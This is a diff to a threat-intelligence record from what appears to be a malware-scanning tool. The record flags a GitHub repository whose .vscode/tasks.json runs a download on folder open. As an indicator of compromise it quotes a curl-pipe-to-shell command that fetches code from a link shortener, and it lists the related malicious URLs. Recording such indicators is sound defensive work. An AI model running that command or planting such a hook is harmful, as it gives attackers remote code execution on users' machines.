@@ -2,6 +2,7 @@
   "finding": {
     "key": "repository:anasbinarif/texas-2026",
     "kind": "repository",
+    "family": "",
     "id": "anasbinarif/texas-2026",
     "url": "https://github.com/anasbinarif/texas-2026",
     "registry": "github",
@@ -20,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 5)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/anasbinarif_texas-2026.json",
     "reviewer_decision": "",
     "notes": ""
@@ -61,7 +62,7 @@
     "evidence_references": "https://github.com/anasbinarif/texas-2026/blob/97439cf863d1c470301a2d868e096c6eb2d6b11d/.vscode/tasks.json",
     "verified_iocs": "locservice.short.gy\nhttps://locservice.short.gy/ZRsvn1k9m\nhttps://locservice.short.gy/ZRsvn1k9l\nhttps://locservice.short.gy/ZRsvn1k9w\ncurl 'https://locservice.short.gy/ZRsvn1k9m' -L | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
